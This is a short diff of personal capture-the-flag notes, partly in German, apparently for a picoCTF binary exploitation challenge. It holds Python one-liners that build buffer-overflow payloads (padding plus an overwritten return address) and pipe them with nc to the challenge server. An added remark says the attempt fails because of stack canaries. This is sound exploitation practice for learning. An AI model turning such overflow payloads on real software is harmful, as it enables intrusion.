@@ -24,7 +24,9 @@ python -c "import sys; sys.stdout.buffer.write(b'B'*112 + b'\x96\x92\x04\x08' + 
 
 # 3
 ```
-python -c "import sys; sys.stdout.buffer.write(b'88' + b'\n' + b'B'*84 + b'\x36\x93\x04\x08' + b'\n')" | nc saturn.picoctf.net 55447
+python -c "import sys; sys.stdout.buffer.write(b'88' + b'\n' + b'B'*84 + b'\x36\x93\x04\x08' + b'\n')" | nc saturn.picoctf.net 54061
 ```
 
 geht nicht wegen stack smashing (geheimer wert der vor dem return überprüft wird)
+
+Stack cannaries, man muss den zufälligen wert lesen oder hoffen, dass der wert nicht zufällig ist
